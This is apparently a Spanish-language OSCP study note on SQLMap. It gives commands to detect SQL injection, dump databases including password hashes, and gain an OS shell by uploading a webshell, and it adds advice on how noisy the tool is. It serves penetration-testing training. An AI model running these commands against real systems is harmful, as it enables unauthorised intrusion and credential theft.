---
tipo: tecnica
fase: explotacion
so: [linux, windows]
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# SQLMap

> [!abstract] Qué es y cuándo usarla
> Herramienta pre-instalada en Kali que **identifica y explota** SQLi automáticamente contra varios motores. Ideal para blind (a mano es lentísimo) y para dumps grandes. **Cero sigilo**: mucho tráfico → no usar de primeras si hay que pasar desapercibido.

## Requisitos previos
- Una URL con parámetro, o una request guardada (POST) desde Burp.
- Saber qué parámetro probar (`-p`).

## Detección
```bash
sqlmap -u http://target/blindsqli.php?user=1 -p user     # -u URL, -p parámetro a testear
```
Pulsar las opciones por defecto (Enter). Devuelve el tipo de inyección (ej. *time-based blind*), el SO del servidor, el stack (PHP/Apache) y el DBMS.

## Dump de datos
```bash
sqlmap -u http://target/blindsqli.php?user=1 -p user --dump   # vuelca la BD actual (tablas + entradas)
```
Con blind time-based es lento pero acaba sacando todos los hashes/credenciales.

## Shell interactiva (--os-shell)
Mejor sobre **UNION-based** (el time-based tiene demasiada latencia para una shell). Guardar la POST con Burp en `post.txt`:
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
Pregunta el lenguaje (PHP), sube un file stager + backdoor al web root y da la `os-shell>` (`id` → `www-data`).

| Flag | Qué hace |
|---|---|
| `-u` | URL objetivo (con el parámetro) |
| `-r` | Fichero con la request HTTP (POST de Burp) |
| `-p` | Parámetro concreto a inyectar |
| `--dump` | Vuelca los datos de las tablas |
| `--os-shell` | Shell interactiva del SO (sube webshell) |
| `--web-root` | Carpeta escribible donde subir la webshell |
| `--time-sec` | Ajustar el delay en time-based |

> [!warning] Detección / problemas
> - Ruidosísimo: no es tool de primera opción en engagements sigilosos.
> - Acepta seguir redirects (302) y usar cookies del servidor cuando lo pregunta → responder `Y`.
> - `--os-shell` necesita una carpeta escribible conocida (misma que `INTO OUTFILE`).
> - Guarda sesión/salida en `~/.local/share/sqlmap/output/<IP>`.

## Visto en
- Módulo: [[10 - SQL Injection Attacks]]
- Cheatsheet: [[Web]]
- Relacionado: [[SQL Injection]]
- Máquinas: [[]]
